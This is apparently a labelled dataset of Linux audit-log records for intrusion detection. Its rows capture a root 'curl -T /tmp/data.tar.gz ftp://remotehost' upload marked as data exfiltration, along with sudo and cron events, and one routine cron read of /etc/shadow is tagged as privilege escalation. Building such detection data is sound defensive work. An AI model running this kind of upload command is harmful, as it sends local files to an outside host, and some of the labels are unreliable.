label,LANG,LANGUAGE,LC_ADDRESS,LC_ALL,LC_COLLATE,LC_CTYPE,LC_IDENTIFICATION,LC_MEASUREMENT,LC_MESSAGES,LC_MONETARY,LC_NAME,LC_NUMERIC,LC_PAPER,LC_TELEPHONE,LC_TIME,PATH,TERM,a0,a1,a10,a11,a12,a13,a14,a15,a16,a17,a18,a19,a2,a20,a21,a22,a23,a24,a25,a26,a27,a28,a29,a3,a30,a4,a5,a6,a7,a8,a9,acct,addr,arch,argc,auid,cap_fe,cap_fi,cap_fp,cap_frootid,cap_fver,cmd,comm,cwd,dev,egid,euid,exe,exit,fsgid,fsuid,gid,grantors,hostname,id,inode,item,items,key,laddr,lport,mode,msg,name,nametype,ogid,op,ouid,path,pid,ppid,proctitle,rdev,res,saddr,saddr_fam,ses,sgid,subj,success,suid,syscall,terminal,tty,type,uid,unit
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.160:823829),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user user:password,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:25.160:823829),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.160:823829),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.160:823829),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x7ffca8e141e0,,,,,,,,,,,0x6e,,,,,,,,,,,0x57ef718a28d0,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:25.160:823829),,,,,,,21664,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.163:823830),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:25.163:823830),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.163:823830),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.163:823830),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x71dce39fdd60,,,,,,,,,,,0x6e,,,,,,,,,,,0x11,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:25.163:823830),,,,,,,21664,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.165:823831),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:25.165:823831),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.165:823831),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.165:823831),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x71dce39fdf50,,,,,,,,,,,0x6e,,,,,,,,,,,0x11,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:25.165:823831),,,,,,,21664,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:25.167:823832),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,127.0.0.53,"53,}",,audit(10/13/2025 09:16:25.167:823832),,,,,,,,,,,,{,inet,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x71dce39ffd8c,,,,,,,,,,,0x10,,,,,,,,,,,0x71dce39fc344,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,0,root,root,root,,,,,,0,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:25.167:823832),,,,,,,21664,20852,,,,,,3,root,unconfined,yes,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:35.183:823833),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,127.0.0.53,"53,}",,audit(10/13/2025 09:16:35.183:823833),,,,,,,,,,,,{,inet,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x71dce39ffd8c,,,,,,,,,,,0x10,,,,,,,,,,,0x71dce39fc344,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,0,root,root,root,,,,,,0,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:35.183:823833),,,,,,,21664,20852,,,,,,3,root,unconfined,yes,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:16:57.312:823836),,,,"PAM:accounting,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:16:57.322:823838),,,,"PAM:setcred,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:16:57.324:823839),,,,"PAM:session_open,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:16:57.312:823836),,,,"PAM:accounting,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:16:57.322:823838),,,,"PAM:setcred,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:16:57.324:823839),,,,"PAM:session_open,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,"pam_limits,pam_env,pam_env,pam_permit,pam_umask,pam_unix""",?,,,,,,,,,audit(10/13/2025 09:16:57.586:823840),,,,"PAM:session_close,""",,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,USER_END,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,ubuntu,,,,,,,,,,,,/usr/bin/sudo,,,,,pam_permit,?,,,,,,,,,audit(10/13/2025 09:16:57.586:823841),,,,PAM:setcred,,,21684,,,,success,,,3,,unconfined,,,,/dev/pts/1,,CRED_DISP,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:57.995:823842),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user user:password,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1853150,1,,,,,"file,755",audit(10/13/2025 09:16:57.995:823842),/lib64/ld-linux-x86-64.so.2,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,1850725,0,,,,,"file,755",audit(10/13/2025 09:16:57.995:823842),/usr/bin/curl,NORMAL,root,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:57.995:823842),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,curl,-T,,,,,,,,,,,/tmp/data.tar.gz,,,,,,,,,,,ftp://remotehost,,--user,user:password,,,,,,,,6,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:57.995:823842),,,,,,,,,,,,,,,,,,,,,,EXECVE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x5c9f01291600,0x5c9f01290050,,,,,,,,,,,0x5c9f0128b440,,,,,,,,,,,0x5c9f0129f930,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,0,root,root,root,,,,,,2,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:57.995:823842),,,,,,,21689,20852,,,,,,3,root,unconfined,yes,root,execve,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823843),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user user:password,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:58.042:823843),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823843),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823843),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x7ffc1f6670e0,,,,,,,,,,,0x6e,,,,,,,,,,,0x59286cfb08d0,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:58.042:823843),,,,,,,21689,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823844),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user user:password,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:58.042:823844),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823844),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.042:823844),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x3,0x7ffc1f6672d0,,,,,,,,,,,0x6e,,,,,,,,,,,0x59286cfb08d0,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:58.042:823844),,,,,,,21689,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823845),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:58.044:823845),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823845),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823845),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x77a140dfdd60,,,,,,,,,,,0x6e,,,,,,,,,,,0x11,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:58.044:823845),,,,,,,21689,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823846),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,,,,,,,,,,,,,0,,,,,,audit(10/13/2025 09:16:58.044:823846),/var/run/nscd/socket,UNKNOWN,,,,,,,,,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/home/ubuntu,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823846),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.044:823846),,,,,,"/var/run/nscd/socket,}",,,,,,{,local,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x77a140dfdf50,,,,,,,,,,,0x6e,,,,,,,,,,,0x11,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,"ENOENT(No,such,file,or,directory)",root,root,root,,,,,,1,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:58.044:823846),,,,,,,21689,20852,,,,,,3,root,unconfined,no,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:16:58.045:823847),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,127.0.0.53,"53,}",,audit(10/13/2025 09:16:58.045:823847),,,,,,,,,,,,{,inet,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x77a140dffd8c,,,,,,,,,,,0x10,,,,,,,,,,,0x77a140dfc344,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,0,root,root,root,,,,,,0,DATA_EXFILTRATION,,,,audit(10/13/2025 09:16:58.045:823847),,,,,,,21689,20852,,,,,,3,root,unconfined,yes,root,connect,,pts1,SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:01.640:823848),,,,,,,,,/usr/sbin/CRON -f -P,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0,none,none,0,0,,,,08:02,,,,,,,,,,,2132944,0,,,,,"file,640",audit(10/13/2025 09:17:01.640:823848),/etc/shadow,NORMAL,shadow,,root,,,,,00:00,,,,,,,,,,,,PATH,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,/var/spool/cron,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:01.640:823848),,,,,,,,,,,,,,,,,,,,,,CWD,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,AT_FDCWD,0x7780c47cf347,,,,,,,,,,,O_RDONLY|O_CLOEXEC,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,unset,,,,,,,cron,,,root,root,/usr/sbin/cron,7,root,root,root,,,,,,1,PRIVILEGE_ESCALATION,,,,audit(10/13/2025 09:17:01.640:823848),,,,,,,21700,1129,,,,,,unset,root,unconfined,yes,root,openat,,(none),SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,unset,,,,,,,,,,,,/usr/sbin/cron,,,,,"pam_permit,pam_localuser""",?,,,,,,,,,audit(10/13/2025 09:17:01.641:823849),,,,"PAM:accounting,""",,,21700,,,,success,,,unset,,unconfined,,,,cron,,USER_ACCT,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,unset,,,,,,,,,,,,/usr/sbin/cron,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:17:01.650:823850),,,,"PAM:setcred,""",,,21700,,,,success,,,unset,,unconfined,,,,cron,,CRED_ACQ,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:01.651:823851),,,,,,,21700,,,,yes,,,93,,"unconfined,old-",,,,,"(none),old-",LOGIN,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:01.651:823851),,,,,,,,,/usr/sbin/CRON -f -P,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x7,0x7ffcb88223c0,,,,,,,,,,,0x1,,,,,,,,,,,0x0,,,,,,,,,,x86_64,,root,,,,,,,cron,,,root,root,/usr/sbin/cron,1,root,root,root,,,,,,0,(null),,,,audit(10/13/2025 09:17:01.651:823851),,,,,,,21700,1129,,,,,,93,root,unconfined,yes,root,write,,(none),SYSCALL,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,root,,,,,,,,,,,,/usr/sbin/cron,,,,,"pam_loginuid,pam_env,pam_env,pam_permit,pam_umask,pam_unix,pam_limits""",?,,,,,,,,,audit(10/13/2025 09:17:01.655:823852),,,,"PAM:session_open,""",,,21700,,,,success,,,93,,unconfined,,,,cron,,USER_START,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,root,,,,,,,,,,,,/usr/sbin/cron,,,,,"pam_permit,pam_cap""",?,,,,,,,,,audit(10/13/2025 09:17:01.663:823853),,,,"PAM:setcred,""",,,21701,,,,success,,,93,,unconfined,,,,cron,,CRED_REFR,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,root,,,,,,,,,,,,/usr/sbin/cron,,,,,pam_permit,?,,,,,,,,,audit(10/13/2025 09:17:01.679:823854),,,,PAM:setcred,,,21700,,,,success,,,93,,unconfined,,,,cron,,CRED_DISP,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,root,?,,,root,,,,,,,,,,,,/usr/sbin/cron,,,,,"pam_loginuid,pam_env,pam_env,pam_permit,pam_umask,pam_unix,pam_limits""",?,,,,,,,,,audit(10/13/2025 09:17:01.680:823855),,,,"PAM:session_close,""",,,21700,,,,success,,,93,,unconfined,,,,cron,,USER_END,root,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,audit(10/13/2025 09:17:08.058:823856),,,,,,,,,curl -T /tmp/data.tar.gz ftp://remotehost --user,,,,,,,,,,,,,PROCTITLE,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,127.0.0.53,"53,}",,audit(10/13/2025 09:17:08.058:823856),,,,,,,,,,,,{,inet,,,,,,,,,SOCKADDR,,
DATA EXFILTRATION,,,,,,,,,,,,,,,,,,0x8,0x77a140dffd8c,,,,,,,,,,,0x10,,,,,,,,,,,0x77a140dfc344,,,,,,,,,,x86_64,,ubuntu,,,,,,,curl,,,root,root,/usr/bin/curl,0,root,root,root,,,,,,0,DATA_EXFILTRATION,,,,audit(10/13/2025 09:17:08.058:823856),,,,,,,21689,20852,,,,,,3,root,unconfined,yes,root,connect,,pts1,SYSCALL,root,
